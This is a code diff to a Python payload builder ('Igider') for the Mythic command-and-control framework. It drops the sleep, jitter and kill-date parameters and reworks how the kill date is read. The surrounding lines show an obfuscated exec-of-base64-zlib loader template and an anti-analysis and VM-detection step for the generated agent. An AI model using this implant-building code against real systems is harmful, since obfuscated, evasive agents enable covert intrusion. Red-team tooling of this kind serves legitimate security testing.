@@ -17,11 +17,6 @@ from itertools import cycle
 
 
 class Igider(PayloadType):
-    """
-    Enhanced Igider payload builder for Mythic C2 framework.
-    Provides a Python-based agent with advanced obfuscation and encryption capabilities.
-    """
-
     name = "igider"
     file_extension = "py"
     author = "@med"
@@ -34,7 +29,6 @@ class Igider(PayloadType):
     note = "Production-ready Python agent with advanced obfuscation and encryption features"
     supports_dynamic_loading = True
     
-    # Enhanced build parameters
     build_parameters = [
         BuildParameter(
             name="output",
@@ -63,24 +57,6 @@ class Igider(PayloadType):
             description="Verify HTTPS certificate (if HTTP, leave yes)",
             choices=["Yes", "No"],
             default_value="Yes"
-        ),
-        BuildParameter(
-            name="sleep_interval",
-            parameter_type=BuildParameterType.Number,
-            description="Sleep time between callbacks (seconds)",
-            default_value="10"
-        ),
-        BuildParameter(
-            name="jitter_percent",
-            parameter_type=BuildParameterType.Number,
-            description="Jitter percentage for sleep randomization (0-100)",
-            default_value="20"
-        ),
-        BuildParameter(
-            name="kill_date",
-            parameter_type=BuildParameterType.Date,
-            description="Date when agent should stop functioning (YYYY-MM-DD)",
-            default_value=""
         )
     ]
     
@@ -114,7 +90,6 @@ class Igider(PayloadType):
         self.logger = self._setup_logger()
         
     def _setup_logger(self) -> logging.Logger:
-        """Configure a logger for build operations."""
         logger = logging.getLogger(f"igider_builder_{self.uuid[:8]}")
         logger.setLevel(logging.DEBUG)
         return logger
@@ -259,8 +234,14 @@ exec(zlib.decompress(base64.b64decode({compressed_b64})))
 
     def _add_evasion_features(self, code: str) -> str:
         """Add anti-analysis and VM detection capabilities."""
-        # Add kill date check if specified
-        kill_date = self.get_parameter("kill_date")
+        # Add kill date check if specified*******************************************
+        try:
+            kill_date = self.c2info[0].get_parameters_dict().get("killdate", None)
+
+        except (IndexError, AttributeError, TypeError) as e:
+            kill_date = None
+            self.logger.warning(f"Could not retrieve kill_date: {e}")
+
         evasion_code = ""
         
         if kill_date and kill_date.strip():
@@ -366,16 +347,6 @@ if not check_environment():
             base_code = base_code.replace("UUID_HERE", self.uuid)
             base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
             
-            # Add sleep configuration
-            sleep_interval = int(self.get_parameter("sleep_interval"))
-            jitter_percent = int(self.get_parameter("jitter_percent"))
-            
-            sleep_config = f"""
-# Sleep configuration
-SLEEP_INTERVAL = {sleep_interval}
-JITTER_PERCENT = {jitter_percent}
-"""
-            base_code = base_code.replace("#SLEEP_CONFIG", sleep_config)
             
             # Process C2 profile configuration
             for c2 in self.c2info:
